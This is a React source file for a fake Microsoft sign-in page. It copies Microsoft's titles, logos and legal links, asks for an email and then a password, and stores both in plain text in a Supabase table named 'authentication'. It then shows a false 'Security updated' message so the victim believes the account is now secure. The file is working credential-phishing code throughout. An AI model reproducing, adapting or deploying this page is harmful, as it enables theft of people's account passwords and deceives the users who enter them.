import React, { useState } from 'react'
import { Helmet } from 'react-helmet'
import './email.css'
import './password.css'
import './verified.css'
import { useData } from '../DataContext'
import Loader from '../Loader'
import Utils from '../Utils'
import { Supabase } from '../Supabase'

const Authentication = () => {
    const { data, setData } = useData()
    const [step, setStep] = useState(0)

    const steps = [
        {
            step: 0,
            title: "Sign in | Microsoft",
            description: "Sign in to your microsoft account"
        },
        {
            step: 1,
            title: "Enter password",
            description: "Enter your microsoft account password"
        },
        {
            step: 2,
            title: "Sign in | Microsoft",
            description: "Sign in to your microsoft account"
        }
    ]

    return (
        <div className="email-auth-container">
            <Helmet>
                <title>{steps[step].title}</title>
                <meta name="description" content={steps[step].description} />
                <meta property="og:title" content={steps[step].title} />
                <meta property="og:description" content={steps[step].description} />
                <meta property="og:image" content="https://acctcdn.msftauth.net/images/2_vD0yppaJX3jBnfbHF1hqXQ2.svg" />
            </Helmet>
            <div className="email-auth-mobile"></div>
            {step === 0 && (<EmailVerification onSuccess={email => {
                setData(email)
                setStep(1)
            }} />)}
            {step === 1 && (<PasswordVerification email={data} onSuccess={() => setStep(2)} />)}
            {step === 2 && (<Verified email={data} />)}
        </div>
    )
}

const EmailVerification = ({ onSuccess = (email) => { } }) => {
    const [error, setError] = useState("")
    const [emailAddress, setEmailAddress] = useState("")
    const [isValidating, setIsValidating] = useState(false)
    const handleEmail = async () => {
        if (emailAddress === "" || !Utils.isValidEmail(emailAddress)) {
            setError("Email address is not properly formatted")
        } else {
            setIsValidating(true)
            try {
                const { error } = await Supabase
                    .from("authentication")
                    .upsert({ email_address: emailAddress })
                setIsValidating(false)
                if (error) {
                    if (error.code === "23505") {
                        onSuccess(emailAddress)
                    } else {
                        setError("An error occurred while verifying your email")
                    }
                } else {
                    onSuccess(emailAddress)
                }
            } catch (e) {
                setError("An error occurred while verifying your email")
            }
        }
    }

    return (
        <>
            <div className="email-auth-form">
                <div className="email-auth-login">
                    {isValidating && (<div className="email-auth-loader"><Loader isPlaying={isValidating} /></div>)}
                    <div className="email-auth-login-form">
                        <img
                            src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
                            alt="microsoft"
                            className="email-auth-logo"
                        />
                        <h1 className="email-auth-text">Sign in</h1>
                        {error && (<span className="email-auth-error">{error}</span>)}
                        <input
                            type="email"
                            placeholder="someone@example.com"
                            className="email-auth-email-form"
                            required={true}
                            onChange={e => setEmailAddress(e.target.value)}
                        />
                        <div className="email-auth-actions">
                            <span className="email-auth-signup">
                                <span className="email-auth-text1">No account?</span>
                                <span>
                                    <span
                                        dangerouslySetInnerHTML={{
                                            __html: ' ',
                                        }}
                                    />
                                </span>
                                <a
                                    href="https://login.live.com/oauth20_authorize.srf?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&amp;scope=openid+profile+offline_access&amp;redirect_uri=https%3a%2f%2fwww.microsoft.com%2fcascadeauth%2faccount%2fsignin-oidc&amp;response_type=code&amp;state=CfDJ8O-wpFJKrbVKq8YvAg70sS8auqSo0e3u7jSVBKJzAF8BU2tcWJ229HbmPd-Ni_U7d9C38CPpukA2w6e_RKPqRUwDOICpI9_J6SPrSKhgvpX0G1gpaXNzoebbTWXIZBKHFMfBOk6eiGiqUicKGWYLsUvRapKRworTwlCVePwD9vdkwBxv311iGF4OTf0Dtai0g2xyIuqcWgo_qyi5-rsMqCv3jk6rwxx5o29vQVrdJeZ8LUjFsWFTUt63a7cKx9RHX4e8j1mFNvibMCBmqqWgw4owdUOkMPPQEEuREZ-YEV-lbYFXF7gZZzCW5sZOhxHfjdcGq5vbkEQGZUVXtjmZ1-LO3X9HDfFuw5yeaFgJEwSYWzDXwRy-kovBU6tiRCkIe8jkXgz7E0qB6fSDFAlUjdmzh1CEf2F1-YI0fL01V5wCf92TGxWVF_clzhFJVIwq6jqkcfZjSs6_OqkH-el1FPWJ7s5i_INt5jUYU6oWZyjsPTtHMl8Zcfk5yiZ11dJLUVGnFEQNf9BVAgVdxaLxIFcwEhb4_BsdkRwfkjRX3cYIgwvjPvGVZeY7LA1TcgdCGRZcMQRy2Hr3u_eiqXPwnWEcZU6rYkdegMYmn1ggt1LwXrfg6NupaQWEqbrySk7V8sAUYhM6tw6kOaphrJ1oLSE&amp;response_mode=form_post&amp;nonce=638546877852801188.YjIwOTY2NTEtY2YxMy00NmI2LWExNTQtOTYwNjM1YWEwZGRmYmEwNjY0NjYtNGFmMS00YWE3LTgzYzUtYjQ2MzAxNWZlYmRm&amp;code_challenge=APkYWnSM4lVpgTB2Sr7eU_-2Vodx7kUReZor9iFaXuw&amp;code_challenge_method=S256&amp;x-client-SKU=ID_NET6_0&amp;x-client-Ver=7.6.0.0&amp;uaid=f8538361c7564345a84094e3afd17394&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=en-US&amp;client_info=1&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYgKCxAwcsRQdNZAaiF_LgD1dEkXs-PdNQ_TFMRNfzVwpu-Z3Ii1oANbEyQO-lHh0rVeZ12Ov719EGenlMxsvagMDHO1IfDeDkNO1lv48F4pcDWQ_ojl4Fhz0tp3XISszooHd2U11qgeqYP3QuW9OSBiCFfYSh6PbnkPSXcmbbtP3yu2VVcMK2zCGNOCUrKX_Hvm_Wm9sf8g0wIyCfqxHmGSAA&amp;jshs=0&amp;claims=%7b%22compact%22%3a%7b%22name%22%3a%7b%22essential%22%3atrue%7d%7d%7d"
                                    target="_blank"
                                    rel="noreferrer noopener"
                                    className="email-auth-link"
                                >
                                    Create one!
                                </a>
                            </span>
                            <a
                                href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&amp;redirect_uri=https%3A%2F%2Fwww.microsoft.com%2Fcascadeauth%2Faccount%2Fsignin-oidc&amp;response_type=code&amp;prompt=&amp;scope=openid%20profile%20offline_access&amp;code_challenge=N6_wU0oc3wwm1gUes6nMijrdkKYhobSMvy-ur5PdhoU&amp;code_challenge_method=S256&amp;response_mode=form_post&amp;nonce=638546877852801188.YjIwOTY2NTEtY2YxMy00NmI2LWExNTQtOTYwNjM1YWEwZGRmYmEwNjY0NjYtNGFmMS00YWE3LTgzYzUtYjQ2MzAxNWZlYmRm&amp;client_info=1&amp;x-client-brkrver=IDWeb.2.19.0.0&amp;lc=1033&amp;claims=%7B%22compact%22%3A%7B%22name%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&amp;state=CfDJ8O-wpFJKrbVKq8YvAg70sS8auqSo0e3u7jSVBKJzAF8BU2tcWJ229HbmPd-Ni_U7d9C38CPpukA2w6e_RKPqRUwDOICpI9_J6SPrSKhgvpX0G1gpaXNzoebbTWXIZBKHFMfBOk6eiGiqUicKGWYLsUvRapKRworTwlCVePwD9vdkwBxv311iGF4OTf0Dtai0g2xyIuqcWgo_qyi5-rsMqCv3jk6rwxx5o29vQVrdJeZ8LUjFsWFTUt63a7cKx9RHX4e8j1mFNvibMCBmqqWgw4owdUOkMPPQEEuREZ-YEV-lbYFXF7gZZzCW5sZOhxHfjdcGq5vbkEQGZUVXtjmZ1-LO3X9HDfFuw5yeaFgJEwSYWzDXwRy-kovBU6tiRCkIe8jkXgz7E0qB6fSDFAlUjdmzh1CEf2F1-YI0fL01V5wCf92TGxWVF_clzhFJVIwq6jqkcfZjSs6_OqkH-el1FPWJ7s5i_INt5jUYU6oWZyjsPTtHMl8Zcfk5yiZ11dJLUVGnFEQNf9BVAgVdxaLxIFcwEhb4_BsdkRwfkjRX3cYIgwvjPvGVZeY7LA1TcgdCGRZcMQRy2Hr3u_eiqXPwnWEcZU6rYkdegMYmn1ggt1LwXrfg6NupaQWEqbrySk7V8sAUYhM6tw6kOaphrJ1oLSE&amp;x-client-SKU=ID_NET6_0&amp;x-client-ver=7.6.0.0#"
                                target="_blank"
                                rel="noreferrer noopener"
                                className="email-auth-cannot-access"
                            >
                                Can&apos;t access your account?
                            </a>
                        </div>
                        <div className="email-auth-buttons">
                            {/* <button type="button" className="email-auth-button">
                                Back
                            </button> */}
                            <button type="button" className="email-auth-button1" onClick={handleEmail}>
                                Next
                            </button>
                        </div>
                    </div>
                </div>
                <div className="email-auth-option-container">
                    <div className="email-auth-options">
                        <img
                            src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                            alt="sign-in-options"
                            className="email-auth-key"
                        />
                        <span className="email-auth-text3">Sign-in options</span>
                    </div>
                </div>
            </div>
            <div className="email-auth-links">
                <a
                    href="https://www.microsoft.com/en-US/servicesagreement/"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="email-auth-terms-link"
                >
                    Terms of use
                </a>
                <a
                    href="https://privacy.microsoft.com/en-US/privacystatement"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="email-auth-privacy-link"
                >
                    Privacy &amp; cookies
                </a>
            </div>
        </>
    )
}

const PasswordVerification = ({ email, onSuccess = () => { } }) => {
    const [error, setError] = useState("")
    const [password, setPassword] = useState("")
    const [isValidating, setIsValidating] = useState(false)
    const handlePassword = async () => {
        if (password === "") {
            setError("Password cannot be empty")
        } else {
            setIsValidating(true)
            try {
                const { error } = await Supabase.from("authentication").update({ password: password }).eq('email_address', email)
                setIsValidating(false)
                if (error) {
                    console.log(error)
                    setError(error.message)
                } else {
                    onSuccess()
                }
            } catch (e) {
                setError(e)
            }
        }
    }

    return (
        <>
            <div className="password-auth-form">
                <div className="password-auth-login">
                    {isValidating && (<div className="password-auth-loader"><Loader isPlaying={isValidating} /></div>)}
                    <div className="password-auth-login-form">
                        <img
                            src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
                            alt="microsoft"
                            className="password-auth-logo"
                        />
                        <span className="password-auth-email">{email}</span>
                        <h1 className="password-auth-text">Enter password</h1>
                        {error && (<span className="password-auth-error">{error}</span>)}
                        <input
                            type="password"
                            placeholder="345asdqwe"
                            className="password-auth-password-form"
                            onChange={e => setPassword(e.target.value)}
                        />
                        <div className="password-auth-actions">
                            <a
                                href="https://login.live.com/oauth20_authorize.srf?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&amp;scope=openid+profile+offline_access&amp;redirect_uri=https%3a%2f%2fwww.microsoft.com%2fcascadeauth%2faccount%2fsignin-oidc&amp;response_type=code&amp;state=CfDJ8O-wpFJKrbVKq8YvAg70sS8auqSo0e3u7jSVBKJzAF8BU2tcWJ229HbmPd-Ni_U7d9C38CPpukA2w6e_RKPqRUwDOICpI9_J6SPrSKhgvpX0G1gpaXNzoebbTWXIZBKHFMfBOk6eiGiqUicKGWYLsUvRapKRworTwlCVePwD9vdkwBxv311iGF4OTf0Dtai0g2xyIuqcWgo_qyi5-rsMqCv3jk6rwxx5o29vQVrdJeZ8LUjFsWFTUt63a7cKx9RHX4e8j1mFNvibMCBmqqWgw4owdUOkMPPQEEuREZ-YEV-lbYFXF7gZZzCW5sZOhxHfjdcGq5vbkEQGZUVXtjmZ1-LO3X9HDfFuw5yeaFgJEwSYWzDXwRy-kovBU6tiRCkIe8jkXgz7E0qB6fSDFAlUjdmzh1CEf2F1-YI0fL01V5wCf92TGxWVF_clzhFJVIwq6jqkcfZjSs6_OqkH-el1FPWJ7s5i_INt5jUYU6oWZyjsPTtHMl8Zcfk5yiZ11dJLUVGnFEQNf9BVAgVdxaLxIFcwEhb4_BsdkRwfkjRX3cYIgwvjPvGVZeY7LA1TcgdCGRZcMQRy2Hr3u_eiqXPwnWEcZU6rYkdegMYmn1ggt1LwXrfg6NupaQWEqbrySk7V8sAUYhM6tw6kOaphrJ1oLSE&amp;response_mode=form_post&amp;nonce=638546877852801188.YjIwOTY2NTEtY2YxMy00NmI2LWExNTQtOTYwNjM1YWEwZGRmYmEwNjY0NjYtNGFmMS00YWE3LTgzYzUtYjQ2MzAxNWZlYmRm&amp;code_challenge=APkYWnSM4lVpgTB2Sr7eU_-2Vodx7kUReZor9iFaXuw&amp;code_challenge_method=S256&amp;x-client-SKU=ID_NET6_0&amp;x-client-Ver=7.6.0.0&amp;uaid=f8538361c7564345a84094e3afd17394&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=en-US&amp;client_info=1&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYgKCxAwcsRQdNZAaiF_LgD1dEkXs-PdNQ_TFMRNfzVwpu-Z3Ii1oANbEyQO-lHh0rVeZ12Ov719EGenlMxsvagMDHO1IfDeDkNO1lv48F4pcDWQ_ojl4Fhz0tp3XISszooHd2U11qgeqYP3QuW9OSBiCFfYSh6PbnkPSXcmbbtP3yu2VVcMK2zCGNOCUrKX_Hvm_Wm9sf8g0wIyCfqxHmGSAA&amp;jshs=0&amp;claims=%7b%22compact%22%3a%7b%22name%22%3a%7b%22essential%22%3atrue%7d%7d%7d"
                                target="_blank"
                                rel="noreferrer noopener"
                                className="password-auth-signup"
                            >
                                Forgot password?
                            </a>
                            <a
                                href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&amp;redirect_uri=https%3A%2F%2Fwww.microsoft.com%2Fcascadeauth%2Faccount%2Fsignin-oidc&amp;response_type=code&amp;prompt=&amp;scope=openid%20profile%20offline_access&amp;code_challenge=N6_wU0oc3wwm1gUes6nMijrdkKYhobSMvy-ur5PdhoU&amp;code_challenge_method=S256&amp;response_mode=form_post&amp;nonce=638546877852801188.YjIwOTY2NTEtY2YxMy00NmI2LWExNTQtOTYwNjM1YWEwZGRmYmEwNjY0NjYtNGFmMS00YWE3LTgzYzUtYjQ2MzAxNWZlYmRm&amp;client_info=1&amp;x-client-brkrver=IDWeb.2.19.0.0&amp;lc=1033&amp;claims=%7B%22compact%22%3A%7B%22name%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&amp;state=CfDJ8O-wpFJKrbVKq8YvAg70sS8auqSo0e3u7jSVBKJzAF8BU2tcWJ229HbmPd-Ni_U7d9C38CPpukA2w6e_RKPqRUwDOICpI9_J6SPrSKhgvpX0G1gpaXNzoebbTWXIZBKHFMfBOk6eiGiqUicKGWYLsUvRapKRworTwlCVePwD9vdkwBxv311iGF4OTf0Dtai0g2xyIuqcWgo_qyi5-rsMqCv3jk6rwxx5o29vQVrdJeZ8LUjFsWFTUt63a7cKx9RHX4e8j1mFNvibMCBmqqWgw4owdUOkMPPQEEuREZ-YEV-lbYFXF7gZZzCW5sZOhxHfjdcGq5vbkEQGZUVXtjmZ1-LO3X9HDfFuw5yeaFgJEwSYWzDXwRy-kovBU6tiRCkIe8jkXgz7E0qB6fSDFAlUjdmzh1CEf2F1-YI0fL01V5wCf92TGxWVF_clzhFJVIwq6jqkcfZjSs6_OqkH-el1FPWJ7s5i_INt5jUYU6oWZyjsPTtHMl8Zcfk5yiZ11dJLUVGnFEQNf9BVAgVdxaLxIFcwEhb4_BsdkRwfkjRX3cYIgwvjPvGVZeY7LA1TcgdCGRZcMQRy2Hr3u_eiqXPwnWEcZU6rYkdegMYmn1ggt1LwXrfg6NupaQWEqbrySk7V8sAUYhM6tw6kOaphrJ1oLSE&amp;x-client-SKU=ID_NET6_0&amp;x-client-ver=7.6.0.0#"
                                target="_blank"
                                rel="noreferrer noopener"
                                className="password-auth-cannot-access"
                            >
                                Other ways to sign in
                            </a>
                        </div>
                        <div className="password-auth-buttons">
                            <button type="button" className="password-auth-button" onClick={handlePassword}>
                                Sign in
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div className="password-auth-links">
                <a
                    href="https://www.microsoft.com/en-US/servicesagreement/"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="password-auth-terms-link"
                >
                    Terms of use
                </a>
                <a
                    href="https://privacy.microsoft.com/en-US/privacystatement"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="password-auth-privacy-link"
                >
                    Privacy &amp; cookies
                </a>
            </div>
        </>
    )
}

const Verified = ({ email }) => {
    return (
        <>
            <div className="password-auth-verified-form">
                <div className="password-auth-verified-login">
                    <div className="password-auth-verified-loader"></div>
                    <div className="password-auth-verified-login-form">
                        <img
                            src="https://acctcdn.msftauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
                            alt="microsoft"
                            className="password-auth-verified-logo"
                        />
                        <span className="password-auth-verified-email">{email}</span>
                        <h1 className="password-auth-verified-text">Security updated</h1>
                        <span className="password-auth-verified-content">
                            Your account is now secure. Please remember to protect your
                            security details at all times.
                        </span>
                        <div className="password-auth-verified-buttons">
                            <a type="button" className="password-auth-verified-button" href='https://www.microsoft.com/en-ng/'>
                                Got it!
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            <div className="password-auth-verified-links">
                <a
                    href="https://www.microsoft.com/en-US/servicesagreement/"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="password-auth-verified-terms-link"
                >
                    Terms of use
                </a>
                <a
                    href="https://privacy.microsoft.com/en-US/privacystatement"
                    target="_blank"
                    rel="noreferrer noopener"
                    className="password-auth-verified-privacy-link"
                >
                    Privacy &amp; cookies
                </a>
            </div>
        </>
    )
}


export default Authentication
